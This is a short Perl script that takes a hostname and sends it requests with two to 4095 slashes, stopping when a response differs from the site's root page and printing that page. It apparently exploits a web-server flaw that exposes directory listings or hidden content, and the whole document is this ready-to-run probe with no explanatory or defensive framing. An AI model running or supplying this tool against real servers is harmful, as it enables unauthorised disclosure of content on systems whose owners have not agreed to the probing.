#!/usr/bin/perl

use LWP::Simple;
use strict;

my $host = shift() || die "usage:  $ARGV[0] [hostname]";
my $cnt;
my $data;
my $odata;
my $i;

$odata = get("http://$host/");
if ($odata eq "")
{
    die "no response from server:  $host\n";
}
for ($i = 2; $i < 4096; $i++)
{
    print "Trying $i...\n";
    $data = get("http://$host" . ("/" x $i));
    if ($data ne $odata)
    {
        print "/ = $i\n\n$data\n\n";
        exit;
    }
}
